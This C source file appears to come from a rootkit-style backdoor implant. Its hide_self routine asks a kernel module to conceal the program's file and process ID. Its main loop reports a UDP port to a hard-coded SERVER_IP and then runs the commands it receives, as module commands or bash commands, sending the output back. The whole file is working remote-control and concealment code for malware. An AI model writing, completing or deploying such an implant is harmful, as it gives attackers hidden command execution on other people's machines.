#include "ProgramCycle.h"

static int hide_self()
{

    char hide_self_file[20];
    strcpy(hide_self_file, HIDE_SELF_FILE);
    if (start_module_command(hide_self_file) == -1)
    {
        return -1;
    }

    char hide_self_pid[20];
    sprintf(hide_self_pid, "2=%d", getpid());

    if (start_module_command(hide_self_pid) == -1)
    {
        return -1;
    }

    return 0;
}

static char *checkTypeAndAct(char *type)
{
    char *cmd;
    string_split(type, &cmd, ':');
    printf("\n%s - %s\n", type, cmd);
    char *response = NULL;
    if (strcmp(MODULE, type) == 0)
        start_module_command(cmd);
    else if (strcmp(BASH, type) == 0)
        response = start_bash_command(cmd);
    else
        printf("Error\n");

    return response;
}

int start_program_cycle()
{

    /*if (hide_self())
    {
        perror("Problem hiding program");
        return -1;
    }*/

    int sockfd;
    struct sockaddr_in cliaddr;
    int udpPort;
    if ((udpPort=bindUDPSocket(&sockfd, UDP_PORT, &cliaddr)) == -1)
        return -1;

    int quit = 0;

    char message[17];
    sprintf(message,"%d", udpPort);
    sendTCPMessage(message, SERVER_IP, TCP_PORT);

    while (!quit)
    {
        socklen_t len= sizeof(cliaddr);

        char *type = receiveUDPPacket(&sockfd, &cliaddr, &len);
        char *response;

        if ((response = checkTypeAndAct(type)) != NULL)
        {
            sendUDPPacket(&sockfd, &cliaddr, len, response);
        }

        free(type);
        free(response);
    }

    return 0;
}